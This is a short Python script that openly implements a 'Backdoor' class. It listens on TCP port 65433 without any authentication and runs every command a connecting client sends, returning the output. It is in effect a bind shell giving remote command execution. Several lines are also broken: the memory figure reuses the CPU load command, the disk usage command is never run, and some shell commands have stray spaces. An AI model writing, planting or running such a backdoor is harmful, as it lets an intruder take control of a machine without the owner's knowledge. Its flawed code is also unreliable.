import os
import time
import socket
import threading

def getIP():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    ipaddress = sock.getsockname()[0]
    sock.close()
    return ipaddress

def formatString(s):
    try:
        s = s.decode().strip()
    except AttributeError:
        pass
    if len(s) == 0:
        return None
    if s.endswith("\x00"):
        s = s[:-2]
    return s

class Backdoor:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = 65433
        self.ipaddress = getIP()
        cpuLoad = os.popen("cat /proc/loadavg | awk '{print $1*100 \"%\"}'").read()
        memUsage = os.popen("cat /proc/loadavg | awk '{print $1*100 \"%\"}'").read()
        diskUsage = "df - h | awk'{if($(NF) == \"/\") {print $(NF-1); exit;}}'"
        userSessions = os.popen("users | wc - l").read()
        sysUptime = os.popen("uptime | awk '{print $3 \" \" $4}' | sed s'/.$//'").read()
        self.bannerArt = """
[--] IP: {0}
[--] CPU Usage: {1}
[--] Memory Usage: {2}
[--] Disk Usage: {3}
[--] Users Logged in: {4}
[--] System uptime: {5}""".format(self.ipaddress, cpuLoad, memUsage, diskUsage, userSessions, sysUptime)
        self.prompt = b"backdoor~$ "
    def create(self):
        self.sock.bind((self.ipaddress, self.port))

    def handleClient(self, connection, address):
        while True:
            try:
                connection.sendto(self.prompt, address)
                data = formatString(connection.recv(1024))
                if data is not None:
                    result = formatString(os.popen(data).read())
                    if result is not None:
                        result = b"[*] Response: " + result.encode()
                        connection.sendto(result, address)
            except (BrokenPipeError, ConnectionAbortedError, ConnectionResetError, UnicodeDecodeError):
                return

    def listen(self):
        try:
            self.sock.listen(1)
            connection, address = self.sock.accept()
            t = threading.Thread(
                target=Backdoor.handleClient, args=(self, connection, address)
            )  # Start thread to handle the connection
            t.start()
        except (BrokenPipeError, ConnectionAbortedError, ConnectionResetError, UnicodeDecodeError):
            return
    def run(self):
        Backdoor.create(self)
        while True:
            Backdoor.listen(self)
if __name__ == '__main__':
    b = Backdoor()
    Backdoor.run(b)
